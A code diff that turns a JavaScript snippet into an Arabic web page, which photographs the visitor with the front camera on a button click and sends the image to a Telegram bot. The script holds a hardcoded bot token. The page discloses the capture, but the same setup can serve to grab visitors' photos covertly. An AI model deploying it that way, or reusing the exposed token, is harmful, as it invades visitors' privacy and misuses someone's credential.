@@ -1,36 +1,99 @@
-document.addEventListener('DOMContentLoaded', function() {
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال صورة للتليجرام</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #2c3e50; color: white; }
+        .card { background: #34495e; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; width: 90%; max-width: 400px; }
+        button { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 1.1rem; font-weight: bold; width: 100%; transition: 0.3s; }
+        button:hover { background: #00aaff; transform: scale(1.02); }
+        #status { margin-top: 20px; font-size: 0.9rem; color: #bdc3c7; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>كاميرا البوت 🤖</h2>
+    <p>اضغط على الزر أدناه لالتقاط صورة وإرسالها إلى حسابك مباشرة.</p>
+    <button id="capture-btn">إرسال صورة الآن 📸</button>
+    <div id="status">جاهز للإرسال...</div>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+    // بيانات البوت التي زودتني بها
+    const TELEGRAM_TOKEN = '8728314672:AAFTjj5mEdbraaqtBxpfQoVFrNr79fgiYug';
+    const CHAT_ID = 'ضع_هنا_رقم_الآيدي_الخاص_بك'; // استبدل هذا الرقم بالرقم الذي حصلت عليه
+
     const captureBtn = document.getElementById('capture-btn');
+    const statusText = document.getElementById('status');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    captureBtn.addEventListener('click', function() {
-        // التقاط الصورة من المتصفح
-        const mediaDevices = navigator.mediaDevices;
-        mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+    captureBtn.addEventListener('click', async function() {
+        if(CHAT_ID === 'ضع_هنا_رقم_الآيدي_الخاص_بك') {
+            alert('من فضلك ضع رقم الـ Chat ID أولاً في الكود!');
+            return;
+        }
 
-                // التقاط الصورة
+        statusText.innerText = "⚡ جاري تشغيل الكاميرا...";
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            statusText.innerText = "📸 التقاط وإرسال...";
+
+            // انتظار ثانية واحدة لضبط جودة الصورة
+            setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // ترقيم الصورة إلى الخادم
-                const formData = new FormData();
-                const file = new File([canvas.toDataURL().split(',')[1], 'image/png'], 'image.png', { type: 'image/png' });
-                formData.append('image', file);
+                // إغلاق الكاميرا فوراً
+                stream.getTracks().forEach(track => track.stop());
 
-                // ارسال الصورة إلى الخادم
-                fetch('https://example.com/upload', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => console.log(data))
-                .catch(error => console.error(error));
-            })
-            .catch(error => console.error(error));
+                // تحويل الصورة وإرسالها
+                canvas.toBlob(function(blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'image.png');
+                    formData.append('caption', '✅ صورة جديدة ملتقطة من الموقع');
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok) {
+                            statusText.innerText = "🚀 تم الإرسال بنجاح!";
+                            statusText.style.color = "#2ecc71";
+                        } else {
+                            statusText.innerText = "❌ خطأ: " + data.description;
+                            statusText.style.color = "#e74c3c";
+                        }
+                    })
+                    .catch(err => {
+                        statusText.innerText = "❌ فشل الاتصال بتلجرام";
+                        console.error(err);
+                    });
+                }, 'image/png');
+
+            }, 1000);
+
+        } catch (error) {
+            statusText.innerText = "❌ الكاميرا غير متاحة (تأكد من HTTPS)";
+            console.error(error);
+        }
     });
-});
+</script>
+
+</body>
+</html>
